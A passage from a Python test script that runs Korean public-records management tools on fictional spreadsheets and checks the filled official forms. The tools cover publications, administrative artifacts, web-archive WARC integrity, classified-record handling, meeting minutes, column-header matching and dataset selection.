    # 간행물·행정박물(2026년 지침, 시행령 별표 4·5) → 서식 5·6·7
    xlsx(f"{t}/간행물.xlsx", [["제목", "발간등록번호", "발행일", "발간형태", "간행물유형", "송부일", "송부부수", "PDF송부", "비밀구분"],
        ["가상 백서", "11-1234567-000001-01", "2025-03-01", "책자", "", "2025-03-10", "3", "Y", ""],
        ["가상 연구보고서", "11-1234567-000002-01", "2025-05-01", "책자", "", "", "2", "N", ""],
        ["가상 연구보고서 부록", "11-1234567-000002-01", "2025-05-01", "책자", "", "", "0", "N", ""],
        ["가상 소식지 5월호", "", "2025-05-01", "책자", "소식지", "", "", "", ""],
        ["가상 보고서", "1-123", "2025-06-01", "전자", "", "", "", "", ""]])
    c1, o1 = run([S("publications-check", "scripts", "pubs_check.py"), f"{t}/간행물.xlsx", "--year", "2025", "-o", f"{t}/산출/간행물.xlsx"])
    pw = openpyxl.load_workbook(f"{t}/산출/간행물.xlsx")
    pj = {r[1]: r[6] for r in pw["점검"].iter_rows(min_row=2, values_only=True)}
    xlsx(f"{t}/행정박물.xlsx", [["등록번호", "생산부서", "행정박물명", "생산일자", "종료일자", "유형", "재질", "크기", "수량", "내용요약", "관련번호",
                               "폐기공고번호", "수령인", "수령일", "증정인", "수령경위", "이관대상", "사유발생일", "이관일"],
        ["1234567-2025-000001", "가상과", "가상 기념우표 견본", "20250301", "20250301", "견본류", "종이", "10×8", "3", "견본", "없음", "", "", "", "", "", "이관", "", ""],
        ["1234567-2025-000002", "가상과", "가상시장 직인(구)", "20200101", "20250630", "관인류", "금속", "3×3×6", "1", "폐기", "없음", "", "", "", "", "", "이관", "2025-07-01", ""],
        ["1234567-2025-000003", "가상과", "가상 기념패", "20251010", "20251010", "그 밖의 유형(공직자선물)", "목재", "30×20×2", "1", "선물", "없음", "", "가상시장", "20251010", "", "", "", "", ""],
        ["1234567-2025-000004", "가상과", "가상 깃발", "20250505", "20250505", "기념류", "직물", "90×60", "2", "깃발", "없음", "", "", "", "", "", "", "", "20251130"]])
    c2, o2 = run([S("admin-artifacts-check", "scripts", "artifacts_check.py"), f"{t}/행정박물.xlsx", "--asof", "2025-12-31", "--today", "2026-11-19",
                  "-o", f"{t}/산출/행정박물.xlsx"])
    aw = openpyxl.load_workbook(f"{t}/산출/행정박물.xlsx")
    aj = {r[1]: r[4] for r in aw["점검"].iter_rows(min_row=2, values_only=True)}
    xlsx(f"{t}/행정박물2.xlsx", [["등록번호", "생산부서", "행정박물명", "생산일자", "종료일자", "유형", "재질", "크기", "수량", "내용요약", "관련번호"],
        ["1234567-2025-000011", "가상과", "개청 기념 청동 메달", "20250301", "20250301", "", "", "5×5", "1", "기념 메달", "없음"],
        ["1234567-2025-000012", "가상과", "구 청사 목재 현판", "20250301", "20250301", "", "", "100×30", "1", "현판", "없음"]])
    run([S("admin-artifacts-check", "scripts", "artifacts_check.py"), f"{t}/행정박물2.xlsx", "--asof", "2025-12-31", "-o", f"{t}/산출/행정박물2.xlsx"])
    aj2 = {r[1]: str(r[4]) for r in openpyxl.load_workbook(f"{t}/산출/행정박물2.xlsx")["점검"].iter_rows(min_row=2, values_only=True)}
    check("행정박물 유형·재질 후보(국가기록원 행정박물 상태검사·점검 매뉴얼 형태·재질 분류)",
          "유형 후보: 상장·상패류" in aj2.get("1234567-2025-000011", "") and "재질 후보: 금속" in aj2.get("1234567-2025-000011", "")
          and "유형 후보: 상징류" in aj2.get("1234567-2025-000012", "") and "재질 후보: 목재" in aj2.get("1234567-2025-000012", ""), str(aj2))
    s5 = {r[0]: r[1] for r in aw["서식 5 수치"].iter_rows(min_row=2, values_only=True)}
    due = {r[0]: r[5] for r in aw["이관 기한"].iter_rows(min_row=2, values_only=True)}
    c3, o3 = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                  "--artifacts", f"{t}/산출/행정박물.xlsx", "--pubs", f"{t}/산출/간행물.xlsx", "-o", f"{t}/산출/통보서식_박물.xlsx"])
    fw = openpyxl.load_workbook(f"{t}/산출/통보서식_박물.xlsx")
    check("간행물 번호 형식·단행본 중복·송부 부족, 행정박물 관리카드·이관 기한(별표 5)·서식 5·6·7 채움",
          "형식" in pj["가상 보고서"] and "중복" in pj["가상 연구보고서"] and "3부" in pj["가상 연구보고서"] and pj["가상 백서"] == "통과"
          and pw["서식 7 수치"]["A2"].value == 2 and pw["서식 7 수치"]["B2"].value == 1
          and "폐기공고번호" in aj["1234567-2025-000002"] and "증정인·수령경위" in aj["1234567-2025-000003"]
          and str(due["1234567-2025-000001"]).startswith("기한 지남") and s5["견본류"] == 3 and s5["합계"] == 5
          and fw["서식 5"]["B6"].value == 3 and fw["서식 6"]["B9"].value is None and fw["서식 6"]["D8"].value == "가상 기념패"
          and fw["서식 7"]["A4"].value == 2 and fw["서식 7"]["B4"].value == 1, o1 + o2 + o3 + str(pj) + str(aj) + str(s5))

    # 웹기록물(시행령 제2조 10호·제46조의2, 2026년 지침 웹기록물): 로컬 시험 누리집·변조 WARC·채널 목록
    import gzip as _gz, http.server, socketserver, threading, functools, hashlib as _hl, base64 as _b64
    site = f"{t}/site"
    os.makedirs(f"{site}/a")
    open(f"{site}/robots.txt", "w", encoding="utf-8").write("User-agent: *\nDisallow: /\n")
    open(f"{site}/index.html", "w", encoding="utf-8").write('<a href="/a/b.html">b</a><a href="javascript:go(1)">1</a><a href="javascript:go(2)">2</a><a href="#">3</a>')
    open(f"{site}/a/b.html", "w", encoding="utf-8").write("<p>b</p>")
    class Quiet(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *a):
            pass
    H = functools.partial(Quiet, directory=site)
    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    body = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<p>hello</p>"
    pdig = "sha1:" + _b64.b32encode(_hl.sha1(b"<p>hello</p>").digest()).decode()
    def rec(b, uri):
        return (f"WARC/1.0\r\nWARC-Type: response\r\nWARC-Record-ID: <urn:uuid:{uri[-1]}>\r\nWARC-Date: 2026-11-20T00:00:00Z\r\n"
                f"WARC-Target-URI: http://x/{uri}\r\nWARC-Payload-Digest: {pdig}\r\nContent-Length: {len(b)}\r\n\r\n").encode() + b + b"\r\n\r\n"
    open(f"{t}/cap.warc.gz", "wb").write(_gz.compress(rec(body, "ok1")) + _gz.compress(rec(body.replace(b"hello", b"hellO"), "bad2")))
    xlsx(f"{t}/채널.xlsx", [["채널명", "주소", "운영부서", "개설일", "종료일", "수집일"],
        ["가상시 블로그", "https://blog.example/x", "홍보과", "2020-01-01", "", "2026-03-01"],
        ["가상 행사 SNS", "https://sns.example/y", "", "2024-01-01", "2025-06-30", ""]])
    env = dict(os.environ, NO_PROXY="127.0.0.1,localhost", no_proxy="127.0.0.1,localhost")
    p_ = subprocess.run([PY, S("web-records-check", "scripts", "web_readiness.py"), "--url", f"http://127.0.0.1:{port}/", "--delay", "0",
                         "--warc", f"{t}/cap.warc.gz", "--channels", f"{t}/채널.xlsx", "--year", "2026", "-o", f"{t}/산출/웹.xlsx"],
                        capture_output=True, text=True, env=env)
    srv.shutdown()
    out = p_.stdout + p_.stderr
    wbw = openpyxl.load_workbook(f"{t}/산출/웹.xlsx")
    fr = {r[0]: r for r in wbw["점검 결과"].iter_rows(min_row=2, values_only=True)}
    wr = {r[1]: r[4] for r in wbw["WARC"].iter_rows(min_row=2, values_only=True)}
    ch = {r[0]: r[5] for r in wbw["SNS·블로그 채널"].iter_rows(min_row=2, values_only=True)}
    check("웹기록물: robots 전체 차단·사이트맵 없음·JS 링크, WARC Payload-Digest 변조, 종료 채널 미수집",
          "robots.txt 전체 차단" in fr and fr["사이트맵"][1] == "고칠 것" and wr["http://x/ok1"] == "통과" and "Payload-Digest 불일치" in wr["http://x/bad2"]
          and ch["가상시 블로그"] == "통과" and "운영부서 없음" in ch["가상 행사 SNS"] and "종료 전 수집" in ch["가상 행사 SNS"], out + str(fr) + str(wr) + str(ch))

    # 비밀기록물(시행령 제68·71조, 서식 10·11): 훅이 비밀 폴더 실행을 막는지, 점검·통보서식 값
    os.makedirs(f"{t}/비밀", exist_ok=True)
    code_h, _ = run([g], json.dumps({"tool_name": "Bash", "tool_input": {"command": f"python classified_check.py {t}/비밀/목록.xlsx --year 2025"}}))
    xlsx(f"{t}/비밀/목록.xlsx", [["식별번호", "생산부서", "제목", "유형", "구분", "수량", "면수", "비밀등급", "보존기간", "보호기간", "예고문처리", "원본구분",
                                "생산일자", "재분류일자", "재분류내용", "변경전등급", "변경전보존기간", "기록관이관일", "영구이관일", "합철", "이관시기연장"],
        ["가-1", "가상과", "가상 A", "문서류", "비전자", "1", "12", "2", "30년", "2027-12-31", "이관", "원본", "2025-03-01", "", "", "", "", "", ""],
        ["가-2", "가상과", "가상 B", "문서류", "전자", "1", "", "3", "10년", "처리 후", "이관", "원본", "2025-05-01", "", "", "", "", "", ""],
        ["가-3", "가상과", "가상 사본", "문서류", "비전자", "1", "3", "2", "30년", "2027-12-31", "파기", "사본", "2025-05-01", "", "", "", "", "", ""],
        ["가-4", "가상과", "가상 지도", "도면카드류", "비전자", "4", "", "2", "3년", "2035-12-31", "파기", "원본", "2025-06-01", "", "", "", "", "", ""],
        ["가-5", "가상과", "가상 2022", "문서류", "비전자", "1", "20", "2", "영구", "2023-12-31", "일반문서로 재분류", "원본", "2022-02-01", "2025-04-01",
         "일반문서", "2", "영구", "", ""],
        ["가-6", "가상과", "가상 영상", "시청각류", "디지털", "1", "", "3", "30년", "2024-06-30", "이관", "원본", "2022-07-01", "", "", "", "", "2025-03-02", ""],
        ["가-7", "가상과", "가상 사본2", "문서류", "비전자", "1", "3", "2", "30년", "2027-12-31", "이관", "사본", "2025-05-01", "", "", "", "", "", ""],
        ["가-8", "가상과", "가상 합철", "문서류", "비전자", "1", "3", "3", "10년", "2026-12-31", "일반문서로 재분류", "원본", "2020-05-01", "2025-03-01", "일반문서", "3", "10년", "", "", "Y", ""],
        ["가-9", "가상과", "가상 특수", "문서류", "전자", "1", "", "2", "영구", "2024-12-31", "이관", "원본", "2010-03-01", "", "", "", "", "2025-02-01", "", "", "Y"]])
    c1, o1 = run([S("classified-records-check", "scripts", "classified_check.py"), f"{t}/비밀/목록.xlsx", "--year", "2025", "--today", "2026-11-20",
                  "-o", f"{t}/비밀/점검.xlsx"])
    cw = openpyxl.load_workbook(f"{t}/비밀/점검.xlsx")
    cj = {r[1]: r[5] for r in cw["점검"].iter_rows(min_row=2, values_only=True)}
    ct = {(r[0], r[1]): r[3] for r in cw["이관 시기"].iter_rows(min_row=2, values_only=True)}
    cprep = {r[0]: r for r in cw["이관 준비"].iter_rows(min_row=2, values_only=True)}
    c10 = {r[0]: r for r in cw["서식 10 수치"].iter_rows(min_row=2, values_only=True)}
    c2, o2 = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                  "--secret", f"{t}/비밀/점검.xlsx", "-o", f"{t}/비밀/통보서식.xlsx"])
    sw = openpyxl.load_workbook(f"{t}/비밀/통보서식.xlsx")
    check("비밀기록물: 훅 차단·사본 제외(사본 '이관' 표시)·불확실 보호기간·보존 말일<보호 말일·원본 파기·유형별 이관 준비, 이관 시기(제68조② 기산일+5년), 서식 10 (가)(나)·11 목록",
          code_h == 2 and "가-3" not in cj and "사본 예고문" in cj.get("가-7", "") and "처리 후" in cj["가-2"] and "최소 10년" in cj["가-4"] and "'파기'" in cj["가-4"] and cj["가-1"] == "통과"
          and ct[("가-5", "처리과→기록관")] == 2026 and ct[("가-6", "기록관→영구")] == 2028 and ct[("가-9", "기록관→영구")] == 2041 and ct[("가-8", "처리과→기록관")] in ("", None)
          and c10[7][2] == 1 and c10[7][4] == 4 and c10[12][2] == 1 and c10[15][2] == 1
          and sw["서식 10"]["F7"].value == 1 and sw["서식 10"]["I7"].value == 4 and sw["서식 11"]["B6"].value == "가-5" and sw["서식 11"]["B14"].value == "가-6"
          and sw["서식 11"]["A2"].value.startswith("(생산기간 : 2022")
          and cprep.get("가-5", [None, ""])[1] == "유형1" and "대각선" in cprep["가-5"][4] and cprep.get("가-6", [None, ""])[1] == "유형2" and "별도서고" in cprep["가-6"][2]
          and any(r[0] == "가-6" and "보호기간 만료" in r[7] for r in cw["재분류 검토서"].iter_rows(min_row=2, values_only=True)), o1 + o2 + str(cj) + str(ct))

    # 서식 9 회의록 생산목록(시행령 제18조①②): 회의체마다 한 줄, 미개최 0, 약칭·서면 무록·지정회의 속기록 부족
    xlsx(f"{t}/회의체.xlsx", [["회의체명", "속기록지정", "부서명", "회의호수", "근거구분", "근거명칭", "근거조항", "최초구성일", "회의기능", "위원장", "위원"],
        ["가상기록물평가심의회", "", "가상과", "5", "법률", "공공기록물 관리에 관한 법률", "제27조의2", "2010.05.04", "폐기 심의", "부기관장(공무원)", "공무원 2명, 민간 3명"],
        ["가상정보공개심의회", "", "가상과", "5", "법률", "정보공개법", "제12조", "2020-01-01", "공개 심의", "부기관장(공무원)", "공무원 3명"],
        ["가상정책조정회의", "지정회의", "기획과", "3", "훈령", "가상시 정책조정회의 운영규정", "제2조", "2021.03.02", "정책 조정", "시장(공무원)", "실국장 8명"],
        ["가상징계위원회", "", "인사과", "5", "법률", "지방공무원법", "제7조", "2000.01.01", "징계", "부시장(공무원)", "공무원 4명"]]
        + [[f"가상위원회{i}", "", "가상과", "5", "조례", f"가상시 위원회{i} 조례", "제3조", "2019.01.01", "심의", "부시장(공무원)", "위원 7명"] for i in range(1, 5)])
    xlsx(f"{t}/회의9.xlsx", [["회의명", "회의종류", "개최방식", "회의록건수", "속기록건수"],
        ["가상기록물평가심의회 제1차", "", "대면", "1", "0"], ["가상기록물평가심의회 제2차", "", "서면", "0", "0"],
        ["가상정보공개심의회 제1차", "5", "대면", "1", "0"], ["가상정책조정회의 1월", "", "대면", "1", "0"], ["가상정책조정회의 2월", "", "영상", "1", "1"]])
    c9, o9 = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                  "--meetings", f"{t}/회의9.xlsx", "--bodies", f"{t}/회의체.xlsx", "-o", f"{t}/산출/통보서식_회의.xlsx"])
    w9 = openpyxl.load_workbook(f"{t}/산출/통보서식_회의.xlsx")
    s9, s8 = w9["서식 9"], w9["서식 8"]
    check("서식 9: 회의체 8줄(행 끼움·수식 유지)·미개최 0·회의호수로 서식 8 분류, 약칭·서면 무록·지정회의 속기록 부족·구성일 형식",
          s9["A12"].value == "가상위원회4" and s9["M8"].value == 0 and s9["L12"].value == "=M12+N12" and s9["M5"].value == 1 and s9["N5"].value == 1
          and s9["P7"].value == 2 and s9["Q7"].value == 1 and s8["C8"].value == 2 and s8["C10"].value == 2
          and "정보공개법" in o9 and "서면 개최 1회에 회의록 0건" in o9 and "지정회의인데 속기록·녹음 1건" in o9 and "YYYY.MM.DD" in o9
          and "지방공무원법" not in o9, o9)
    xlsx(f"{t}/회의체j.xlsx", [["회의체명", "속기록지정", "부서명", "회의호수", "근거구분", "근거명칭", "근거조항", "최초구성일"],
        ["고용정책심의회", "", "고용정책과", "5", "법률", "고용정책 기본법", "제10조", "2005.03.19"]])
    xlsx(f"{t}/회의j.xlsx", [["회의명", "회의종류", "개최방식", "회의록건수", "속기록건수"], ["고용정책심의회 제1차", "5", "대면", "1", "0"]])
    cj9, oj9 = run([S("production-status-report", "scripts", "fill_official_form.py"), f"{t}/생산등록.xlsx", "--form", form, "--year", "2025",
                    "--meetings", f"{t}/회의j.xlsx", "--bodies", f"{t}/회의체j.xlsx", "-o", f"{t}/산출/통보서식_지정.xlsx"])
    sj9 = openpyxl.load_workbook(f"{t}/산출/통보서식_지정.xlsx")["서식 9"]
    check("서식 9 지정회의 자동 표시: 국가기록원 속기록 생산의무 지정회의 현황('26. 4. 1., 97개)과 대조", "지정회의 현황" in oj9 and "고용노동부" in oj9
          and "지정회의인데 속기록·녹음 0건" in oj9 and sj9["B5"].value == "지정회의", oj9)

    # 한 번에 돌리기(run_all.py): 입력 폴더 → 점검 → 서식 1~9 → 통보전_확인.md, 비밀 파일은 건너뜀
    ind = f"{t}/통보입력"
    os.makedirs(ind)
    for src, dst in (("생산등록.xlsx", "2025_등록정보.xlsx"), ("회의9.xlsx", "회의목록.xlsx"), ("회의체.xlsx", "회의체목록.xlsx"),
                     ("행정박물.xlsx", "행정박물목록.xlsx"), ("간행물.xlsx", "간행물목록.xlsx"), ("비밀/목록.xlsx", "비밀목록.xlsx")):
        shutil.copyfile(f"{t}/{src}", f"{ind}/{dst}")
    cr, orr = run([S("production-status-report", "scripts", "run_all.py"), ind, "--year", "2025", "-o", f"{t}/산출/통보준비"])
    md = open(f"{t}/산출/통보준비/통보전_확인.md", encoding="utf-8").read()
    fw2 = openpyxl.load_workbook(f"{t}/산출/통보준비/생산현황_통보서식_2025.xlsx")
    cr2, orr2 = run([S("production-status-report", "scripts", "run_all.py"), ind, "--year", "2025", "-o", f"{t}/산출/통보준비"])
    check("한 번에: 5단계 실행·서식 1·2·5·6·7·8·9 채움·고칠 것 모음·비밀 파일 건너뜀(이름 안 적음)·산출 폴더 덮어쓰기 거부",
          cr == 0 and "실패" not in md and "건너뛴 비밀 관련 항목 1개" in md and "비밀목록" not in md and "가상비밀건" not in md
          and "서식 3·4('시청각' 파일 없음)" in md and fw2["서식 7"]["A4"].value == 2 and fw2["서식 9"]["A5"].value == "가상기록물평가심의회"
          and fw2["서식 5"]["B6"].value == 3 and "관인류는 폐기공고번호" in md and cr2 == 2, orr + md[:1500] + orr2)

    # 열 맞춤(header_check): 머리글만 읽기, 띄어쓰기·괄호·별표·년도 차이 '비슷함', --map, --fix 사본(원본 그대로), run_all --fix-headers
    import openpyxl as _ox
    wbh = _ox.Workbook()
    wsh = wbh.active
    wsh.append(["2025년 등록정보 내려받기"])
    wsh.append(["생산부서 (처리과)명 ", "생산 년도", "단위과제명", "보존 기간*", "기록물 형태", "기록물유형", "공개구분", "생산등록번호", "기록물건 제목(필수)", "쪽수", "실물쪽수", "비밀구분"])
    wsh.append(["행정과", "2025", "기획", "10년", "전자", "일반문서", "공개", "행정과-1", "가상 비공개 제목 XYZ", "3", "", ""])
    wbh.save(f"{t}/기관내보내기.xlsx")
    h1, oh1 = run([S("records-qa-gate", "scripts", "header_check.py"), f"{t}/기관내보내기.xlsx", "--script", "production_status"])
    h2, oh2 = run([S("records-qa-gate", "scripts", "header_check.py"), f"{t}/기관내보내기.xlsx", "--script", "production_status",
                   "--map", "기록물건 제목(필수)=제목", "--fix", "-o", f"{t}/산출/열맞춤.xlsx"])
    h3, oh3 = run([S("production-status-report", "scripts", "production_status.py"), f"{t}/산출/열맞춤.xlsx", "--year", "2025", "-o", f"{t}/산출/열맞춤_현황.xlsx"])
    orig = _ox.load_workbook(f"{t}/기관내보내기.xlsx").active["B2"].value
    h4, oh4 = run([S("records-qa-gate", "scripts", "header_check.py"), f"{t}/비밀/목록.xlsx"])
    ind2 = f"{t}/통보입력2"
    os.makedirs(ind2)
    shutil.copyfile(f"{t}/기관내보내기.xlsx", f"{ind2}/등록정보.xlsx")
    h5, oh5 = run([S("production-status-report", "scripts", "run_all.py"), ind2, "--year", "2025", "--fix-headers", "-o", f"{t}/산출/통보준비2"])
    md2 = open(f"{t}/산출/통보준비2/통보전_확인.md", encoding="utf-8").read()
    check("열 맞춤: 머리글만 읽음·'비슷함' 4개·--map·--fix 사본으로 집계 통과·원본 그대로·비밀 폴더 거부·run_all --fix-headers",
          h1 == 0 and "비슷함: '생산 년도' → '생산연도'" in oh1 and "XYZ" not in oh1 + oh2 and "2행" in oh1 and h2 == 0 and "머리글 5개" in oh2
          and h3 == 0 and "고칠 것 0" in oh3 and orig == "생산 년도" and h4 == 2
          and os.path.exists(f"{t}/산출/통보준비2/열맞춤_등록정보.xlsx") and "고친 사본" in md2 and "XYZ" not in md2, oh1 + oh2 + oh3 + oh4 + md2[:800])

    # 별지 제7호서식 작업지(정수점검서·상태검사서 가~마)와 결과 반영
    xlsx(f"{t}/보존7.xlsx", [["관리번호", "제목", "유형", "상태등급", "최근정수점검", "최근상태검사", "생산연도", "서고", "서가", "보존상자번호"],
        ["가-1", "가상 계획철", "종이", "2", "2023", "2010", "1990", "1서고", "A-01", "B-001"], ["가-2", "가상 사진첩", "사진", "", "2025", "2014", "1995", "2서고", "P-02", ""],
        ["가-3", "가상 녹음테이프", "오디오 카세트", "", "2022", "2020", "2000", "3서고", "AV-1", ""], ["가-4", "가상 행사영상", "비디오테이프", "", "2024", "2023", "2005", "3서고", "AV-2", ""],
        ["가-6", "가상 LTO", "전자매체(LTO)", "", "2025", "2020", "2015", "전산실", "", ""], ["가-7", "가상 철2", "종이", "1", "2025", "2020", "2000", "1서고", "A-02", ""]])
    i1, oi1 = run([S("preservation-inspection", "scripts", "inspection_form.py"), "form", f"{t}/보존7.xlsx", "--year", "2026", "-o", f"{t}/산출/별지7.xlsx"])
    fw7 = openpyxl.load_workbook(f"{t}/산출/별지7.xlsx")
    sh = fw7.sheetnames
    cnt = [r[1] for r in fw7["1. 정수점검서"].iter_rows(min_row=5, values_only=True)]
    fw7["1. 정수점검서"]["D2"] = "2026-04-10"
    for r in range(5, fw7["1. 정수점검서"].max_row + 1):
        fw7["1. 정수점검서"].cell(r, 7).value = "이상 없음"
    fw7["가. 종이류"]["D2"] = "2026-05-02"
    fw7["가. 종이류"].cell(5, 7).value = 3
    fw7["가. 종이류"].cell(5, 9).value = 2
    fw7.save(f"{t}/산출/별지7_작성.xlsx")
    i2, oi2 = run([S("preservation-inspection", "scripts", "inspection_form.py"), "apply", f"{t}/산출/별지7_작성.xlsx", f"{t}/보존7.xlsx", "-o", f"{t}/산출/보존7_갱신.xlsx"])
    up = openpyxl.load_workbook(f"{t}/산출/보존7_갱신.xlsx")
    rows7 = {r[0]: r for r in up.worksheets[0].iter_rows(min_row=2, values_only=True)}
    orig7 = openpyxl.load_workbook(f"{t}/보존7.xlsx").active["F2"].value
    check("별지 제7호: 올해 대상만 정수점검서(3)·상태검사서 가~마·보존매체 시트, 검사전 등급 미리 채움, 결과 반영(최악 등급·연도)·3등급 사후조치·원본 그대로",
          i1 == 0 and cnt == ["가-1", "가-3", "가-4"] and "라. 비디오영화필름류" in sh and "보존매체" in sh and fw7["가. 종이류"]["F5"].value == 2
          and fw7["나. 사진필름류"]["E5"].value == "가-2" and i2 == 0 and rows7["가-1"][3] == 3 and rows7["가-1"][5] == 2026 and rows7["가-3"][4] == 2026
          and "사후조치 후보" in up.sheetnames and orig7 == "2010", oi1 + oi2 + str(cnt) + str(sh))

    # NAK 39:2026 제정(안) 공통업무 기준(--common-basis nak39안): 대학 보존기간 바뀐 과제, 확정 전 알림
    xlsx(f"{t}/대학목록.xlsx", [["단위과제코드", "단위과제명", "보존기간", "생산연도", "제목"], ["", "출결관리", "10년", "2010", "가상 출결부"], ["", "소청관리", "준영구", "2010", "가상 소청"]])
    n1, on1 = run([S("retention-review", "scripts", "check_retention.py"), f"{t}/대학목록.xlsx", "--common", "대학", "--year", "2026", "-o", f"{t}/산출/대학_준칙.xlsx"])
    n2, on2 = run([S("retention-review", "scripts", "check_retention.py"), f"{t}/대학목록.xlsx", "--common", "대학", "--common-basis", "nak39안", "--year", "2026",
                   "-o", f"{t}/산출/대학_nak39.xlsx"])
    import csv as _c
    nak = list(_c.DictReader(open(S("retention-review", "assets", "common", "nak39_2026_draft.csv"), encoding="utf-8-sig")))
    diff = open(S("retention-review", "references", "nak39-draft-diff.md"), encoding="utf-8").read()
    check("NAK 39 제정(안): 1,333행·6유형·확정 전 알림·예고안 불일치 메모·차이표(대학 출결 10→5년)",
          len(nak) == 1333 and {r["기관유형"] for r in nak} == {"중앙행정기관", "지방자치단체", "교육(행정)기관", "학교", "공공기관", "대학"}
          and n1 == 0 and n2 == 0 and "확정 고시 전" in on2 and "확정 고시 전" not in on1
          and any(r["분류번호"] == "SNG0131" and "불일치" in r["검토메모"] for r in nak) and "출결관리: 10년 → **5년**" in diff, on1 + on2)

    # 2026 지침: 데이터세트 관리대상 선정(A·B·C)과 통합(전자+비전자) 이관 준비
    xlsx(f"{t}/시스템목록.xlsx", [["시스템명", "시스템개요", "데이터세트내용", "부서명", "담당자", "연락처", "DB저장", "연계표출", "자체생성", "다른법률"],
        ["교육훈련시스템", "기록관리교육 운영 전반 관리", "수강신청, 수강이력", "교육과", "김가상", "000", "예", "", "", ""],
        ["유해사이트차단시스템", "유해사이트 접속을 차단하는 시스템", "유해사이트 목록", "정보과", "", "", "예", "", "", ""],
        ["통계포털", "다른 시스템 데이터 표출", "", "기획과", "", "", "", "예", "예", ""], ["지도서비스", "연계 공간정보 표출", "", "기획과", "", "", "", "예", "", ""],
        ["온나라 업무관리시스템", "문서 생산", "", "행정과", "", "", "", "", "", ""], ["기관 대표 홈페이지 민원게시판", "민원 게시판", "민원 글", "홍보과", "", "", "", "", "", ""],
        ["가상금융시스템", "자금 집행", "거래내역", "재무과", "", "", "", "", "", "가상금융법"]])
    d1, od1 = run([S("dataset-schedule", "scripts", "dataset_screen.py"), f"{t}/시스템목록.xlsx", "--org", "가상기관", "-o", f"{t}/산출/데이터세트선정.xlsx"])
    dw = openpyxl.load_workbook(f"{t}/산출/데이터세트선정.xlsx")
    dt_ = {r[4]: (r[7], r[8]) for r in dw["선정 협의 서식"].iter_rows(min_row=3, values_only=True)}
    # 국가기록원 '관리대상 선정협의 예시'(행정정보 데이터세트 게시판) 유형 21개 중 헷갈리기 쉬운 것
    xlsx(f"{t}/선정예시.xlsx", [["시스템명", "시스템개요", "데이터세트 내용", "부서명"],
        ["경영지원", "사업관리 업무를 지원하는 시스템", "운용관리, 결재관리, 감사지원, 사업모니터링 등", "재단"],
        ["네트워크 관리 시스템(NMS)", "네트워크 구성/성능/장애/운영 관리 시스템", "네트워크 구성, 성능 정보", "재단"],
        ["사내 메신저", "공사 내부 메신저", "사용자 정보, 송수신 쪽지 목록 등", "재단"], ["사내 웹메일 시스템", "웹메일 시스템", "송수신 메일 내용 등", "재단"],
        ["재단 모바일앱", "홈페이지에서 제공되는 대고객 학자금 지원 업무 제공", "학자금대출, 장학금", "재단"], ["전자문서시스템", "전자문서 생산 시스템", "전자문서, 게시판 목록 등", "재단"],
        ["웹필터링 시스템", "유해 웹사이트 차단", "차단 목록", "재단"]])
    d2, od2 = run([S("dataset-schedule", "scripts", "dataset_screen.py"), f"{t}/선정예시.xlsx", "-o", f"{t}/산출/선정예시.xlsx"])
    ex = {r[4]: str(r[7])[:1] for r in openpyxl.load_workbook(f"{t}/산출/선정예시.xlsx")["선정 협의 서식"].iter_rows(min_row=3, values_only=True)} if os.path.exists(f"{t}/산출/선정예시.xlsx") else {}
    check("데이터세트 관리대상 유형: 국가기록원 선정협의 예시와 같은 판단(A 1·B 4·C 2)", ex == {"경영지원": "A", "네트워크 관리 시스템(NMS)": "B", "사내 메신저": "B",
          "사내 웹메일 시스템": "B", "재단 모바일앱": "C", "전자문서시스템": "C", "웹필터링 시스템": "B"}, od2 + str(ex))
    xlsx(f"{t}/건목록.xlsx", [["철분류번호", "철제목", "생산연도", "등록번호", "등록일자", "건명", "형태", "보낸기관", "받은기관", "쪽수", "붙임", "분리등록", "비밀구분"],
        ["F1", "가상 계획철", "2014", "행정과-1", "2014-03-02", "가상 계획 보고", "전자", "", "", "", "1. 계획서 1부(별송)", "", ""],
        ["F1", "가상 계획철", "2014", "행정과-2", "2014-03-05", "가상 회신", "비전자", "가상청", "가상과", "4", "", "", ""],
        ["F2", "가상 홍보철", "2013", "홍보-1", "2013-05-01", "가상 홍보", "전자", "", "", "", "홍보 사진 CD 1매", "", ""],
        ["F2", "가상 홍보철", "2013", "홍보-2", "2013-05-02", "가상 CDMA 사업", "전자", "", "", "", "", "", ""],
        ["F3", "가상 신규철", "2020", "신규-1", "2020-01-01", "가상", "전자", "", "", "", "따로보냄", "", ""],
        ["F4", "가상 비밀", "2014", "보안-1", "2014-01-01", "가상 비밀건 QQQ", "비전자", "", "", "", "", "", "Ⅲ급"]])
    i1, oi1 = run([S("transfer-reconcile", "scripts", "integrated_transfer.py"), f"{t}/건목록.xlsx", "-o", f"{t}/산출/통합이관.xlsx"])
    iw = openpyxl.load_workbook(f"{t}/산출/통합이관.xlsx")
    cand = {r[2]: (r[4], r[5]) for r in iw["비전자 붙임 후보"].iter_rows(min_row=2, values_only=True)}
    alltext = " ".join(str(c) for ws_ in iw.worksheets for r in ws_.iter_rows(values_only=True) for c in r if c)
    check("2026 지침: 데이터세트 A·B(①~④)·C 후보와 제외사유 / 통합이관 비전자건·별송 강한·약한 단서(CDMA 제외)·~2015·비밀 제외",
          d1 == 0 and dt_["교육훈련시스템"][0] == "A" and dt_["유해사이트차단시스템"][0] == "B" and dt_["통계포털"][0] == "A" and dt_["지도서비스"][0] == "B"
          and dt_["온나라 업무관리시스템"][0] == "C" and dt_["기관 대표 홈페이지 민원게시판"][0] == "A" and dt_["가상금융시스템"][1].startswith("B④")
          and i1 == 0 and cand["행정과-1"][0] == "별송" and cand["홍보-1"][1] == "CD" and "홍보-2" not in cand and "신규-1" not in cand
          and "QQQ" not in alltext and "행정과-2" in alltext, od1 + oi1 + str(dt_) + str(cand))

    # 2026 지침: 공개재분류 1호 법령 조항·이관 전 재분류(최근 5년 생략), 평가 의견 작성 안내
    xlsx(f"{t}/비공개이관.xlsx", [["관리번호", "제목", "공개구분", "비공개사유", "생산연도", "최근재분류연도"],
